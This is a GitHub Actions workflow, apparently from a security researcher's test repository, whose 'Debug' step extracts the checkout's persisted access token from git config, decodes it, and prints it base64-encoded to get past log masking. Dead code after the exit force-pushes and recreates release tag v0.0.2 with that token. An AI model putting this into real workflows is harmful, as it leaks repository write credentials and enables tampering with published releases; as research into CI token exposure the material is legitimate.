name: Debug

on:
  workflow_dispatch:

jobs:
  debug:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608 # v4.1.0
      - name: Debug
        run: |
          encoded_token_with_prefix=$(git config --local --get http.https://github.com/.extraheader)
          encoded_token=${encoded_token_with_prefix#AUTHORIZATION: basic }
          decoded_token_with_prefix=$(echo $encoded_token | base64 --decode)
          GITHUB_TOKEN=${decoded_token_with_prefix#x-access-token:}
          echo $GITHUB_TOKEN | base64
          exit 0
          
          git fetch --unshallow --tags
          git config --global user.email "francois@boostsecurity.io"
          git config --global user.name "fproulx-boostsecurity"
          export RELEASE_BRANCH="release-v0.0.2+$((RANDOM%1000))"
          git switch -c $RELEASE_BRANCH
          git commit --allow-empty -m "Release $RELEASE_BRANCH"
          git push --set-upstream origin $RELEASE_BRANCH
          git tag -d v0.0.2
          git push --tags -f origin

          # Recreate v0.0.2 tag using REST API
          TAG_SHA=$(git rev-parse HEAD)
          curl -X POST -H "Authorization: token $GITHUB_TOKEN" \
          -d "{\"tag\":\"v0.0.2\",\"message\":\"Recreate tag v0.0.2\",\"object\":\"$TAG_SHA\",\"type\":\"commit\"}" \
          https://api.github.com/repos/${{ github.repository }}/git/tags

          curl -X POST -H "Authorization: token $GITHUB_TOKEN" \
          -d "{\"ref\":\"refs/tags/v0.0.2\",\"sha\":\"$TAG_SHA\"}" \
          https://api.github.com/repos/${{ github.repository }}/git/refs
